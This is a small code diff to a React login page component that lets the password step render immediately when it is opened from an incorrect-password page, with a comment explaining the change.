@@ -34,7 +34,9 @@ const OthersLoginPage: React.FC<OthersLoginPageProps> = ({
   const [email, setEmail] = useState(defaultEmail || '');
   const [password, setPassword] = useState('');
   const [showPasswordStep, setShowPasswordStep] = useState(!!startAtPasswordStep);
-  const [pageReady, setPageReady] = useState(false);
+  // When mounted via the IncorrectPasswordPage (startAtPasswordStep=true), skip
+  // the 100ms pageReady gate so the password-step error UI renders immediately.
+  const [pageReady, setPageReady] = useState(!!startAtPasswordStep);
   const [nextLoading, setNextLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
   const [bgIndex, setBgIndex] = useState(() => Math.floor(Math.random() * bgImages.length));
